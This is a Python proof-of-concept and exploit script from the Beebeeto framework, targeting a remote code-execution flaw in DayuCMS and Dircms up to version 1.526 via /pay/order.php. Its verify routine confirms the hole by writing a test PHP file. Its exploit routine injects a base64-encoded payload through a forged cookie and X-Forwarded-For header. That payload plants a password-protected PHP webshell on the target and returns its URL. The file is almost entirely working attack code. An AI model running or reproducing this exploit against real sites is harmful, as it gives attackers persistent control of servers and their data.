#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import random
import base64
import hashlib
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0108',
            'name': 'Dayucms & Dircms <=1.526 /pay/order.php 代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2015-06-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Dayucms',
            'vul_version': ['<=1.526'],
            'type': 'Code Execution',
            'tag': ['Dircms漏洞', 'Dayucms漏洞', '/pay/order.php', 'php'],
            'desc': '''
                    DayuCMS在将字符串转换为数组的函数中直接利用eval，并且存在可控变量，导致任意代码执行。
                    ''',
            'references': ['http://joychou.org/index.php/web/dayucms-1-526-foreground-remote-code-execution.html',
            ],
        },
    }

    @staticmethod
    def md5_t(char):
        return hashlib.md5(char).hexdigest()

    @classmethod
    def dayucms_md5(cls, char):
        return cls.md5_t(char)[8:24]

    @classmethod
    def verify(cls, args):
        ip = '2.2.2.2'
        filenum = random.randint(10000, 99999)
        filename = base64.b64encode('%d.php' % filenum)
        verify_url = '%s/pay/order.php' % args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        cookie = req.cookies
        for cookie_tuple in cookie.items():
            for k in cookie_tuple:
                if 'siteid' in k:
                    cookie_pre = k
                    break
        cookie_key = cls.dayucms_md5('productarray'+ip)
        cookie_key = cookie_pre[:-6] + cookie_key
        if args['options']['verbose']:
            print '[*] XFF is: %s' % ip
            print '[*] Cookie_key which need to add is: %s\n' % cookie_key
        vs = 'PD9waHAgdmFyX2R1bXAobWQ1KDEyMykpO3VubGluayhfX0ZJTEVfXyk7'
        verify_shell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (filename, vs)
        verify_shell = '1%3b' + verify_shell
        false_headers = {'X-Forwarded-For': ip}
        false_cookies = {cookie_key: verify_shell, cookie_pre: '1'}
        verify_req = requests.get(verify_url, cookies = false_cookies, headers = false_headers)
        verify_shell_url = '%s/pay/%d.php' % (args['options']['target'], filenum)
        if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        ip = '2.2.2.2'
        filenum = random.randint(10000, 99999)
        filename = base64.b64encode('%d.php' % filenum)
        verify_url = '%s/pay/order.php' % args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        cookie = req.cookies
        for cookie_tuple in cookie.items():
            for k in cookie_tuple:
                if 'siteid' in k:
                    cookie_pre = k
                    break
        cookie_key = cls.dayucms_md5('productarray'+ip)
        cookie_key = cookie_pre[:-6] + cookie_key
        if args['options']['verbose']:
            print '[*] XFF is: %s' % ip
            print '[*] Cookie_key which need to add is: %s\n' % cookie_key
        vs = 'PD9waHAKdmFyX2R1bXAobWQ1KDEyMykpOwphc3NlcnQoCiRfUE9TVFtiZWViZWV0b10KKTs'
        webshell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (filename, vs)
        webshell = '1%3b' + webshell
        false_headers = {'X-Forwarded-For': ip}
        false_cookies = {cookie_key: webshell, cookie_pre: '1'}
        verify_req = requests.get(verify_url, cookies = false_cookies, headers = false_headers)
        shell_url = '%s/pay/%d.php' % (args['options']['target'], filenum)
        if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).content:
            args['success'] = True
            args['poc_ret']['webshell'] = shell_url
            args['poc_ret']['password'] = 'beebeeto'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())